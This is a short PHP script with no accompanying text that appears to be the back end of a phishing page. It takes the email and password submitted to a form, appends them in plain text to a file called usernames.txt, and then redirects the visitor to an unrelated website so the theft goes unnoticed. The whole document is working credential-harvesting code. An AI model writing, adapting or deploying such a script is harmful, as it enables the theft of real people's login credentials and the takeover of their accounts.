<?php

file_put_contents("usernames.txt", " Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.idenna.com/congratulations-its-a-web');
exit();
?>
